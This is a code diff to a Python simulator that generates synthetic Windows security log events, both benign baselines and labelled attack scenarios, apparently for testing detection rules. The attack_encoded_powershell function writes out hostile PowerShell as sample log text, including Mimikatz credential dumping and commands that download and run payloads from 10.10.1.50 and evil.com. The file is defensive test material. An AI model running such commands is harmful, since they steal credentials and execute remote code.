@@ -284,12 +284,168 @@ def gen_linux_normal():
     }
 
 
+def gen_powershell_scriptblock_normal():
+    """Normal PowerShell script block logging (EID 4104) — benign admin scripts."""
+    host = random.choice(HOSTNAMES[:8])
+    user, domain = random.choice(USERS[:6])
+    scripts = [
+        "Get-Service | Where-Object {$_.Status -eq 'Running'}",
+        "Get-EventLog -LogName System -Newest 20",
+        "Get-ChildItem -Path C:\\Users -Recurse -Filter *.log | Measure-Object",
+        "Import-Module ActiveDirectory; Get-ADUser -Filter *",
+        "Get-Process | Sort-Object -Property CPU -Descending | Select-Object -First 10",
+        "Test-NetConnection -ComputerName dc01.corp.local -Port 389",
+        "$env:COMPUTERNAME; $env:USERNAME; Get-Date",
+        "Get-WmiObject Win32_OperatingSystem | Select-Object Caption, Version",
+    ]
+    return {
+        "@timestamp": now_iso(),
+        "event": {"category": "process", "type": "info", "action": "Execute a Remote Command", "code": "4104"},
+        "powershell": {
+            "file": {
+                "script_block_text": random.choice(scripts),
+                "script_block_id": str(uuid4()),
+            }
+        },
+        "winlog": {"event_data": {"ScriptBlockText": random.choice(scripts)}},
+        "process": {"name": "powershell.exe", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": random_pid()},
+        "user": {"name": user, "domain": domain},
+        "host": {"name": host, "os": {"platform": "windows"}},
+        "agent": {"type": "winlogbeat"},
+        "_simulation": {"type": "baseline", "label": "normal_ps_scriptblock"}
+    }
+
+
+def gen_file_create_normal():
+    """Normal file creation (Sysmon EID 11) — Office saves, temp files, updates."""
+    host = random.choice(HOSTNAMES[:8])
+    user, domain = random.choice(USERS[:6])
+    files = [
+        ("WINWORD.EXE", "C:\\Program Files\\Microsoft Office\\root\\Office16\\WINWORD.EXE",
+         f"C:\\Users\\{user}\\Documents\\Report_Q1.docx"),
+        ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe",
+         f"C:\\Users\\{user}\\Downloads\\meeting_notes.pdf"),
+        ("explorer.exe", "C:\\Windows\\explorer.exe",
+         f"C:\\Users\\{user}\\Desktop\\screenshot.png"),
+        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe",
+         "C:\\Windows\\SoftwareDistribution\\Download\\update_kb12345.cab"),
+        ("msiexec.exe", "C:\\Windows\\System32\\msiexec.exe",
+         "C:\\Windows\\Installer\\{guid}\\install.tmp"),
+        ("notepad.exe", "C:\\Windows\\System32\\notepad.exe",
+         f"C:\\Users\\{user}\\Documents\\notes.txt"),
+    ]
+    proc_name, proc_path, file_path = random.choice(files)
+    file_path = file_path.format(user=user) if "{user}" in file_path else file_path
+    return {
+        "@timestamp": now_iso(),
+        "event": {"category": "file", "type": "creation", "action": "File created (rule: FileCreate)", "code": "11"},
+        "file": {
+            "path": file_path,
+            "name": file_path.rsplit("\\", 1)[-1],
+            "directory": file_path.rsplit("\\", 1)[0],
+        },
+        "process": {"name": proc_name, "executable": proc_path, "pid": random_pid()},
+        "user": {"name": user, "domain": domain},
+        "host": {"name": host, "os": {"platform": "windows"}},
+        "agent": {"type": "sysmon"},
+        "_simulation": {"type": "baseline", "label": "normal_file_create"}
+    }
+
+
+def gen_dns_query_normal():
+    """Normal DNS queries (Sysmon EID 22) — browsing, updates, O365."""
+    host = random.choice(HOSTNAMES[:8])
+    domains = [
+        "www.microsoft.com", "login.microsoftonline.com", "outlook.office365.com",
+        "www.google.com", "fonts.googleapis.com", "cdn.jsdelivr.net",
+        "github.com", "api.github.com", "update.googleapis.com",
+        "wpad.corp.local", "dc01.corp.local", "fileserver.corp.local",
+        "ctldl.windowsupdate.com", "settings-win.data.microsoft.com",
+    ]
+    processes = [
+        ("chrome.exe", "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"),
+        ("outlook.exe", "C:\\Program Files\\Microsoft Office\\root\\Office16\\OUTLOOK.EXE"),
+        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe"),
+        ("teams.exe", "C:\\Users\\user\\AppData\\Local\\Microsoft\\Teams\\current\\Teams.exe"),
+    ]
+    proc_name, proc_path = random.choice(processes)
+    return {
+        "@timestamp": now_iso(),
+        "event": {"category": "network", "type": "protocol", "action": "Dns query (rule: DnsQuery)", "code": "22"},
+        "dns": {"question": {"name": random.choice(domains), "type": "A"}},
+        "process": {"name": proc_name, "executable": proc_path, "pid": random_pid()},
+        "host": {"name": host, "os": {"platform": "windows"}},
+        "agent": {"type": "sysmon"},
+        "_simulation": {"type": "baseline", "label": "normal_dns_query"}
+    }
+
+
+def gen_named_pipe_normal():
+    """Normal named pipe events (Sysmon EID 17/18) — Windows IPC."""
+    host = random.choice(HOSTNAMES[:8])
+    pipes = [
+        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "\\lsass"),
+        ("services.exe", "C:\\Windows\\System32\\services.exe", "\\wkssvc"),
+        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "\\srvsvc"),
+        ("lsass.exe", "C:\\Windows\\System32\\lsass.exe", "\\netlogon"),
+        ("spoolsv.exe", "C:\\Windows\\System32\\spoolsv.exe", "\\spoolss"),
+        ("svchost.exe", "C:\\Windows\\System32\\svchost.exe", "\\epmapper"),
+        ("SearchIndexer.exe", "C:\\Windows\\System32\\SearchIndexer.exe", "\\SearchTextHarvester"),
+    ]
+    proc_name, proc_path, pipe_name = random.choice(pipes)
+    eid = random.choice(["17", "18"])
+    return {
+        "@timestamp": now_iso(),
+        "event": {
+            "category": "file", "type": "creation" if eid == "17" else "access",
+            "action": "Pipe Created (rule: PipeEvent)" if eid == "17" else "Pipe Connected (rule: PipeEvent)",
+            "code": eid,
+        },
+        "file": {"name": pipe_name},
+        "process": {"name": proc_name, "executable": proc_path, "pid": random_pid()},
+        "host": {"name": host, "os": {"platform": "windows"}},
+        "agent": {"type": "sysmon"},
+        "_simulation": {"type": "baseline", "label": "normal_named_pipe"}
+    }
+
+
+def gen_service_install_normal():
+    """Normal service installation (Windows System EID 7045) — updates, software installs."""
+    host = random.choice(HOSTNAMES[:8])
+    services = [
+        ("Windows Update", "C:\\Windows\\System32\\svchost.exe -k netsvcs -p", "share process", "auto start"),
+        ("Google Update Service", "C:\\Program Files (x86)\\Google\\Update\\GoogleUpdate.exe /svc", "own process", "demand start"),
+        ("Microsoft Monitoring Agent", "C:\\Program Files\\Microsoft Monitoring Agent\\Agent\\MonitoringHost.exe", "own process", "auto start"),
+        ("Dell SupportAssist", "C:\\Program Files\\Dell\\SupportAssistAgent\\bin\\SupportAssistAgent.exe", "own process", "auto start"),
+    ]
+    svc_name, svc_path, svc_type, start_type = random.choice(services)
+    return {
+        "@timestamp": now_iso(),
+        "event": {"category": "configuration", "type": "installation", "action": "Service installed", "code": "7045"},
+        "winlog": {"event_data": {
+            "ServiceName": svc_name,
+            "ImagePath": svc_path,
+            "ServiceType": svc_type,
+            "StartType": start_type,
+            "AccountName": "LocalSystem",
+        }},
+        "host": {"name": host, "os": {"platform": "windows"}},
+        "agent": {"type": "winlogbeat"},
+        "_simulation": {"type": "baseline", "label": "normal_service_install"}
+    }
+
+
 BASELINE_GENERATORS = [
     (gen_process_create_normal, 30),
     (gen_network_connection_normal, 25),
     (gen_registry_normal, 10),
     (gen_logon_normal, 10),
     (gen_linux_normal, 15),
+    (gen_powershell_scriptblock_normal, 5),
+    (gen_file_create_normal, 8),
+    (gen_dns_query_normal, 12),
+    (gen_named_pipe_normal, 3),
+    (gen_service_install_normal, 1),
 ]
 
 
@@ -518,6 +674,146 @@ def attack_amsi_patch():
     return events
 
 
+def attack_encoded_powershell():
+    """Scattered Spider encoded PowerShell via script block logging (T1027 + T1059.001)"""
+    host = random.choice(HOSTNAMES[:8])
+    user, domain = random.choice(USERS[:3])
+    scripts = [
+        "Invoke-Mimikatz -DumpCreds",
+        "[System.Net.WebClient]::new().DownloadString('http://10.10.1.50/payload.ps1') | IEX",
+        "Get-Process lsass | ForEach-Object { $_.Modules } | Out-File C:\\Temp\\lsass_modules.txt",
+        "$wc = New-Object System.Net.WebClient; $wc.DownloadFile('http://evil.com/shell.exe','C:\\Temp\\svc.exe')",
+    ]
+    script = random.choice(scripts)
+    return [{
+        "@timestamp": now_iso(),
+        "event": {"category": "process", "type": "info", "action": "Execute a Remote Command", "code": "4104"},
+        "powershell": {
+            "file": {
+                "script_block_text": script,
+                "script_block_id": str(uuid4()),
+            }
+        },
+        "winlog": {"event_data": {"ScriptBlockText": script}},
+        "process": {"name": "powershell.exe", "executable": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "pid": random_pid()},
+        "user": {"name": user, "domain": domain},
+        "host": {"name": host, "os": {"platform": "windows"}},
+        "agent": {"type": "winlogbeat"},
+        "_simulation": {"type": "attack", "technique": "T1027", "fawkes_command": "powershell", "label": "encoded_ps_scriptblock"}
+    }]
+
+
+def attack_file_drop():
+    """Scattered Spider RMM tool drop + Fawkes upload (T1219 + T1105)"""
+    host = random.choice(HOSTNAMES[:8])
+    user, domain = random.choice(USERS[:3])
+    drops = [
+        ("AnyDesk.exe", f"C:\\Users\\{user}\\AppData\\Local\\Temp\\AnyDesk.exe", "cmd.exe"),
+        ("TeamViewer.exe", f"C:\\Users\\{user}\\Downloads\\TeamViewer.exe", "chrome.exe"),
+        ("ScreenConnect.ClientService.exe", f"C:\\Users\\{user}\\AppData\\Local\\Temp\\ScreenConnect.ClientService.exe", "powershell.exe"),
+        ("splashtop_streamer.exe", f"C:\\ProgramData\\splashtop_streamer.exe", "cmd.exe"),
+        ("update_svc.exe", f"C:\\Users\\{user}\\AppData\\Local\\Temp\\update_svc.exe", "sync_agent.exe"),
+    ]
+    file_name, file_path, parent = random.choice(drops)
+    return [{
+        "@timestamp": now_iso(),
+        "event": {"category": "file", "type": "creation", "action": "File created (rule: FileCreate)", "code": "11"},
+        "file": {
+            "path": file_path,
+            "name": file_name,
+            "directory": file_path.rsplit("\\", 1)[0],
+        },
+        "process": {"name": parent, "executable": f"C:\\Windows\\System32\\{parent}", "pid": random_pid()},
+        "user": {"name": user, "domain": domain},
+        "host": {"name": host, "os": {"platform": "windows"}},
+        "agent": {"type": "sysmon"},
+        "_simulation": {"type": "attack", "technique": "T1219", "fawkes_command": "upload", "label": "rmm_tool_drop"}
+    }]
+
+
+def attack_dns_rmm():
+    """Scattered Spider RMM tool DNS queries (T1219)"""
+    host = random.choice(HOSTNAMES[:8])
+    c2_domains = [
+        "relay.screenconnect.com", "my.screenconnect.com",
+        "*.teamviewer.com", "client.teamviewer.com",
+        "download.anydesk.com", "relay-de.anydesk.com",
+        "tunnel.ngrok.io", "connect.ngrok-agent.com",
+        "*.splashtop.com",
+    ]
+    events = []
+    for domain in random.sample(c2_domains, random.randint(2, 4)):
+        events.append({
+            "@timestamp": now_iso(),
+            "event": {"category": "network", "type": "protocol", "action": "Dns query (rule: DnsQuery)", "code": "22"},
+            "dns": {"question": {"name": domain.lstrip("*."), "type": "A"}},
+            "process": {"name": "svchost.exe", "executable": "C:\\Windows\\System32\\svchost.exe", "pid": random_pid()},
+            "host": {"name": host, "os": {"platform": "windows"}},
+            "agent": {"type": "sysmon"},
+            "_simulation": {"type": "attack", "technique": "T1219", "label": "rmm_dns_query"}
+        })
+    return events
+
+
+def attack_named_pipe_c2():
+    """C2 named pipe — Cobalt Strike / Fawkes style (T1559 + T1055)"""
+    host = random.choice(HOSTNAMES[:8])
+    user, domain = random.choice(USERS[:3])
+    malicious_pipes = [
+        "\\MSSE-1234-server", "\\msagent_01", "\\postex_ssh_1234",
+        "\\status_08", "\\DserNamePipe1234", "\\win_svc",
+    ]
+    pipe_name = random.choice(malicious_pipes)
+    return [
+        {
+            "@timestamp": now_iso(),
+            "event": {"category": "file", "type": "creation", "action": "Pipe Created (rule: PipeEvent)", "code": "17"},
+            "file": {"name": pipe_name},
+            "process": {"name": "update_helper.exe", "executable": f"C:\\Users\\{user}\\AppData\\Local\\Temp\\update_helper.exe", "pid": random_pid()},
+            "user": {"name": user, "domain": domain},
+            "host": {"name": host, "os": {"platform": "windows"}},
+            "agent": {"type": "sysmon"},
+            "_simulation": {"type": "attack", "technique": "T1559.001", "label": "c2_named_pipe"}
+        },
+        {
+            "@timestamp": now_iso(),
+            "event": {"category": "file", "type": "access", "action": "Pipe Connected (rule: PipeEvent)", "code": "18"},
+            "file": {"name": pipe_name},
+            "process": {"name": "svchost.exe", "executable": "C:\\Windows\\System32\\svchost.exe", "pid": random_pid()},
+            "host": {"name": host, "os": {"platform": "windows"}},
+            "agent": {"type": "sysmon"},
+            "_simulation": {"type": "attack", "technique": "T1559.001", "label": "c2_pipe_connect"}
+        },
+    ]
+
+
+def attack_service_persistence():
+    """Fawkes service -action create — malicious service install (T1543.003)"""
+    host = random.choice(HOSTNAMES[:8])
+    user, domain = random.choice(USERS[:3])
+    services = [
+        ("WindowsUpdateSvc", f"C:\\Users\\{user}\\AppData\\Local\\Temp\\update_svc.exe"),
+        ("SystemHealthMonitor", f"C:\\ProgramData\\health_monitor.exe"),
+        ("WinDefendHelper", f"C:\\Users\\Public\\defender_helper.exe"),
+    ]
+    svc_name, svc_path = random.choice(services)
+    return [{
+        "@timestamp": now_iso(),
+        "event": {"category": "configuration", "type": "installation", "action": "Service installed", "code": "7045"},
+        "winlog": {"event_data": {
+            "ServiceName": svc_name,
+            "ImagePath": svc_path,
+            "ServiceType": "own process",
+            "StartType": "auto start",
+            "AccountName": "LocalSystem",
+        }},
+        "user": {"name": user, "domain": domain},
+        "host": {"name": host, "os": {"platform": "windows"}},
+        "agent": {"type": "winlogbeat"},
+        "_simulation": {"type": "attack", "technique": "T1543.003", "fawkes_command": "service", "label": "malicious_service_install"}
+    }]
+
+
 ATTACK_SCENARIOS = [
     ("Process Injection (T1055.001)", attack_process_injection),
     ("Registry Persistence (T1547.001)", attack_persistence_registry),
@@ -527,6 +823,11 @@ ATTACK_SCENARIOS = [
     ("Token Theft (T1134.001)", attack_token_theft),
     ("C2 Beacon (T1071.001)", attack_c2_beacon),
     ("AMSI Patch (T1562.001)", attack_amsi_patch),
+    ("Encoded PowerShell (T1027)", attack_encoded_powershell),
+    ("RMM Tool Drop (T1219)", attack_file_drop),
+    ("RMM DNS Queries (T1219)", attack_dns_rmm),
+    ("C2 Named Pipe (T1559)", attack_named_pipe_c2),
+    ("Service Persistence (T1543.003)", attack_service_persistence),
 ]
 
 
@@ -586,6 +887,17 @@ def ensure_index_template():
                     "winlog.event_data.StartModule": {"type": "keyword"},
                     "winlog.event_data.StartFunction": {"type": "keyword"},
                     "winlog.event_data.SourceProcessGUID": {"type": "keyword"},
+                    "winlog.event_data.ScriptBlockText": {"type": "text"},
+                    "winlog.event_data.ServiceName": {"type": "keyword"},
+                    "winlog.event_data.ImagePath": {"type": "keyword"},
+                    "winlog.event_data.ServiceType": {"type": "keyword"},
+                    "winlog.event_data.StartType": {"type": "keyword"},
+                    "winlog.event_data.AccountName": {"type": "keyword"},
+                    "powershell.file.script_block_text": {"type": "text"},
+                    "powershell.file.script_block_id": {"type": "keyword"},
+                    "dns.question.name": {"type": "keyword"},
+                    "dns.question.type": {"type": "keyword"},
+                    "file.directory": {"type": "keyword"},
                     "_simulation.type": {"type": "keyword"},
                     "_simulation.technique": {"type": "keyword"},
                     "_simulation.fawkes_command": {"type": "keyword"},
